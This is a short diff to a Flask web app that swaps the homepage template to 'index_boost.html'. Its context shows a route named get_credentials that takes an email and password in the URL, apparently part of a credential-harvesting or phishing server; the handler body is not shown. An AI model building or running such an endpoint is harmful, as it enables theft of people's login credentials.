@@ -5,7 +5,7 @@ root = Flask(__name__, template_folder='page')
 
 @root.route('/')
 def index():
-	return render_template('index.html')
+	return render_template('index_boost.html')
 
 @root.route('/cred/<email>/<passwd>')
 def get_credentials(email, passwd):
